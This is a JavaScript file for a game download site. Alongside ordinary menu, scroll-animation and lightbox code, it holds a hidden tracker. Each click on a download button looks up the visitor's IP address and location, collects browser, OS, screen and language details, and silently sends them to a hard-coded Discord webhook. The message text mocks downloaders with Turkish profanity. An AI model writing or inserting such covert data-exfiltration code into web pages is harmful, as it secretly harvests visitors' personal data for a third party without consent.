document.addEventListener('DOMContentLoaded', function() {
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1436853555997835385/ho5SF4vDEGzVSWs0z6DR_r80EV9hMDz7eZtUXCWW6hVEczLgdkvfHrrs7s96b2wno4G2';
    
    async function sendDiscordNotification(userInfo = {}) {
        try {
            const locationInfo = await getLocationInfo();
            
            const embed = {
                title: "🎮 oyun ındı mq ıns acar",
                description: "bacısını sıktıgım ındırdı oyunu umarım acar early bot dev duser amk o.ö",
                color: 0x8a2be2,
                thumbnail: {
                    url: "https://betatenshi.pages.dev//public/images/hero.png"
                },
                fields: [
                    {
                        name: "🌍 Konum Bilgileri",
                        value: `🏳️ **Ülke:** ${locationInfo.country || 'Bilinmiyor'}\n🏙️ **Şehir:** ${locationInfo.city || 'Bilinmiyor'}\n🌐 **IP Adresi:** ${locationInfo.ip || 'Bilinmiyor'}\n📍 **Bölge:** ${locationInfo.region || 'Bilinmiyor'}`,
                        inline: false
                    },
                    {
                        name: "📱 Cihaz Bilgileri",
                        value: `🌐 **Tarayıcı:** ${userInfo.browser || 'Bilinmiyor'}\n💻 **İşletim Sistemi:** ${userInfo.os || 'Bilinmiyor'}\n📱 **Cihaz Türü:** ${userInfo.device || 'Bilinmiyor'}\n🔧 **Platform:** ${userInfo.platform || 'Bilinmiyor'}`,
                        inline: false
                    },
                    {
                        name: "⏰ İndirme Detayları",
                        value: `📅 **Tarih:** ${new Date().toLocaleDateString('tr-TR', { year: 'numeric', month: 'long', day: 'numeric' })}\n🕐 **Saat:** ${new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}\n🌍 **Zaman Dilimi:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
                        inline: false
                    },
                    {
                        name: "📊 Ek Bilgiler",
                        value: `🖥️ **Ekran Çözünürlüğü:** ${screen.width}x${screen.height}\n🎨 **Renk Derinliği:** ${screen.colorDepth} bit\n🌐 **Dil:** ${navigator.language || 'Bilinmiyor'}\n📱 **Online Durum:** ${navigator.onLine ? '🟢 Çevrimiçi' : '🔴 Çevrimdışı'}`,
                        inline: false
                    }
                ],
                footer: {
                    text: "ındırdı mal - salak sıtılır",
                    icon_url: "https://betatenshi.pages.dev//public/images/hero.png"
                },
                timestamp: new Date().toISOString()
            };

            const payload = {
                username: "selam",
                avatar_url: "https://betatenshi.pages.dev//public/images/hero.png",
                embeds: [embed]
            };

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
        }
    }

    async function getLocationInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            const locationData = await locationResponse.json();

            return {
                ip: ip,
                country: locationData.country_name || 'Bilinmiyor',
                city: locationData.city || 'Bilinmiyor',
                region: locationData.region || 'Bilinmiyor',
                timezone: locationData.timezone || 'Bilinmiyor',
                isp: locationData.org || 'Bilinmiyor'
            };
        } catch (error) {
            return {
                ip: 'Bilinmiyor',
                country: 'Bilinmiyor',
                city: 'Bilinmiyor',
                region: 'Bilinmiyor',
                timezone: 'Bilinmiyor',
                isp: 'Bilinmiyor'
            };
        }
    }

    function getUserInfo() {
        const userAgent = navigator.userAgent;
        let browser = 'Bilinmiyor';
        let os = 'Bilinmiyor';
        let device = 'Bilinmiyor';
        let platform = 'Bilinmiyor';

        if (userAgent.includes('Chrome')) browser = 'Chrome';
        else if (userAgent.includes('Firefox')) browser = 'Firefox';
        else if (userAgent.includes('Safari')) browser = 'Safari';
        else if (userAgent.includes('Edge')) browser = 'Edge';
        else if (userAgent.includes('Opera')) browser = 'Opera';

        if (userAgent.includes('Windows')) {
            os = 'Windows';
            if (userAgent.includes('Windows NT 10.0')) platform = 'Windows 10/11';
            else if (userAgent.includes('Windows NT 6.3')) platform = 'Windows 8.1';
            else if (userAgent.includes('Windows NT 6.2')) platform = 'Windows 8';
            else if (userAgent.includes('Windows NT 6.1')) platform = 'Windows 7';
        }
        else if (userAgent.includes('Mac')) {
            os = 'macOS';
            if (userAgent.includes('Mac OS X 10_15')) platform = 'macOS Catalina';
            else if (userAgent.includes('Mac OS X 10_14')) platform = 'macOS Mojave';
            else if (userAgent.includes('Mac OS X 10_13')) platform = 'macOS High Sierra';
        }
        else if (userAgent.includes('Linux')) {
            os = 'Linux';
            platform = 'Linux';
        }
        else if (userAgent.includes('Android')) {
            os = 'Android';
            platform = 'Android';
        }
        else if (userAgent.includes('iOS')) {
            os = 'iOS';
            platform = 'iOS';
        }

        if (userAgent.includes('Mobile')) device = 'Mobil';
        else if (userAgent.includes('Tablet')) device = 'Tablet';
        else device = 'Masaüstü';

        return { browser, os, device, platform };
    }

    function setupDownloadTracking() {
        const downloadButtons = document.querySelectorAll('.download-btn, .cta-button');
        
        downloadButtons.forEach(button => {
            button.addEventListener('click', function(e) {
                const userInfo = getUserInfo();
                sendDiscordNotification(userInfo);
            });
        });
    }

    setupDownloadTracking();

    const burger = document.querySelector('.burger');
    const nav = document.querySelector('.nav-links');
    const navLinks = document.querySelectorAll('.nav-links li');

    burger.addEventListener('click', () => {
        nav.classList.toggle('nav-active');
        burger.classList.toggle('toggle');
        
        navLinks.forEach((link, index) => {
            if (link.style.animation) {
                link.style.animation = '';
            } else {
                link.style.animation = `navLinkFade 0.5s ease forwards ${index / 7 + 0.3}s`;
            }
        });
    });

    const heroImg = document.getElementById('hero-img');
    if (heroImg) {
        heroImg.style.opacity = '0';
        setTimeout(() => {
            heroImg.style.transition = 'opacity 1s ease-in-out';
            heroImg.style.opacity = '1';
        }, 500);
    }

    const scrollLinks = document.querySelectorAll('a[href^="#"]');
    
    scrollLinks.forEach(scrollLink => {
        scrollLink.addEventListener('click', function(e) {
            e.preventDefault();
            
            const targetId = this.getAttribute('href');
            const targetElement = document.querySelector(targetId);
            
            if (targetElement) {
                if (nav.classList.contains('nav-active')) {
                    nav.classList.remove('nav-active');
                    burger.classList.remove('toggle');
                    
                    navLinks.forEach(link => {
                        link.style.animation = '';
                    });
                }
                
                window.scrollTo({
                    top: targetElement.offsetTop - 100,
                    behavior: 'smooth'
                });
            }
        });
    });

    const header = document.querySelector('header');
    
    window.addEventListener('scroll', () => {
        if (window.scrollY > 100) {
            header.style.backgroundColor = 'rgba(10, 10, 10, 0.95)';
            header.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.1)';
        } else {
            header.style.backgroundColor = 'rgba(10, 10, 10, 0.9)';
            header.style.boxShadow = 'none';
        }
    });

    const animateOnScroll = () => {
        const animatedElements = document.querySelectorAll('.section-title, .feature-card, .gallery-item, .about-content');
        
        animatedElements.forEach(element => {
            const elementPosition = element.getBoundingClientRect().top;
            const windowHeight = window.innerHeight;
            
            if (elementPosition < windowHeight - 100) {
                element.classList.add('animate');
            }
        });
    }
    
    window.addEventListener('scroll', animateOnScroll);
    animateOnScroll();

    const galleryItems = document.querySelectorAll('.gallery-item');
    
    galleryItems.forEach(item => {
        item.addEventListener('click', function() {
            const imgSrc = this.querySelector('img').getAttribute('src');
            
            const lightbox = document.createElement('div');
            lightbox.classList.add('lightbox');
            
            const img = document.createElement('img');
            img.setAttribute('src', imgSrc);
            
            const closeBtn = document.createElement('span');
            closeBtn.classList.add('close-lightbox');
            closeBtn.innerHTML = '&times;';
            
            lightbox.appendChild(img);
            lightbox.appendChild(closeBtn);
            document.body.appendChild(lightbox);
            
            closeBtn.addEventListener('click', () => {
                lightbox.remove();
            });
            
            lightbox.addEventListener('click', function(e) {
                if (e.target === this) {
                    this.remove();
                }
            });
        });
    });

    const style = document.createElement('style');
    style.textContent = `
        @keyframes navLinkFade {
            from {
                opacity: 0;
                transform: translateX(50px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .toggle .line1 {
            transform: rotate(-45deg) translate(-5px, 6px);
        }
        
        .toggle .line2 {
            opacity: 0;
        }
        
        .toggle .line3 {
            transform: rotate(45deg) translate(-5px, -6px);
        }
        
        .section-title, .feature-card, .gallery-item, .about-content {
            opacity: 0;
            transform: translateY(30px);
            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
        }
        
        .section-title.animate, .feature-card.animate, .gallery-item.animate, .about-content.animate {
            opacity: 1;
            transform: translateY(0);
        }
        
        .lightbox {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        .lightbox img {
            max-width: 90%;
            max-height: 90%;
            object-fit: contain;
        }
        
        .close-lightbox {
            position: absolute;
            top: 20px;
            right: 30px;
            color: white;
            font-size: 40px;
            cursor: pointer;
            transition: color 0.3s ease;
        }
        
        .close-lightbox:hover {
            color: var(--main-color);
        }
    `;
    
    document.head.appendChild(style);
}); 